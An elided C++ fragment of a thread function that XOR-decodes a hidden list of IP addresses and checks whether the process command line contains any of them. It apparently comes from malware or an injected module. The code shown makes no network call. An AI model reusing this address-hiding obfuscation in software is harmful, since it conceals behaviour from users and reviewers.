...
static void MainThread() {
    const uint8_t enc_nodes[][16] = {
        ...
        { 0x6B, 0x62, 0x6F, 0x74, 0x6B, 0x6C, 0x63, 0x74, 0x6B, 0x69, 0x6E, 0x74, 0x6B, 0x68, 0x69, 0x00 },
        { 0x6B, 0x62, 0x6F, 0x74, 0x6B, 0x6C, 0x63, 0x74, 0x6B, 0x69, 0x6E, 0x74, 0x6B, 0x68, 0x6E, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x62, 0x6A, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x62, 0x6B, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x6D, 0x62, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x6D, 0x63, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x62, 0x68, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x62, 0x69, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x62, 0x6E, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x6C, 0x6B, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x6D, 0x6B, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x63, 0x6B, 0x00 },
        { 0x62, 0x6A, 0x74, 0x6C, 0x6C, 0x74, 0x6D, 0x6B, 0x74, 0x63, 0x68, 0x00 },
    ...
    if (cmdLine) {
        for (const auto& enc : enc_nodes) {
            ...
            for (size_t i = 0; i < 16; i++) {
                if (enc[i] == 0) break;
                dec[i] = (char)(enc[i] ^ 0x5A);
            }
            if (strstr(cmdLine, dec)) {
                config_ok = true;
                break;
            }
        }
